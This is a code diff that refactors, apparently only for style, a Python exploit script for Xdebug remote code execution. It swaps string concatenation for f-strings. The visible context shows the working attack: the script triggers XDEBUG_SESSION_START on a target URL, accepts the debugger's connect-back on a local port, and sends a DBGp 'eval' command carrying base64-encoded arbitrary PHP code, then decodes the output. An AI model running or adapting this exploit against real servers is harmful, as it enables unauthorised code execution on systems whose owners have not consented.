@@ -43,7 +43,7 @@ def recv_xml(sock):
 def trigger(url):
     time.sleep(2)
     try:
-        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
+        session.get(f'{url}?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
     except:
         pass
 
@@ -54,7 +54,7 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--target', required=True, help='target url.')
     parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
     args = parser.parse_args()
-    
+
     ip_port = ('0.0.0.0', args.listen)
     sk = socket.socket()
     sk.settimeout(10)
@@ -66,7 +66,7 @@ if __name__ == '__main__':
     conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))
 
     data = recv_xml(conn)
-    print('[+] Recieve data: ' + data.decode())
+    print(f'[+] Recieve data: {data.decode()}')
     g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
     if not g:
         print('[-] No result...')
@@ -75,6 +75,6 @@ if __name__ == '__main__':
     data = g.group(1)
 
     try:
-        print('[+] Result: ' + base64.b64decode(data).decode())
+        print(f'[+] Result: {base64.b64decode(data).decode()}')
     except binascii.Error:
         print('[-] May be not string result...')
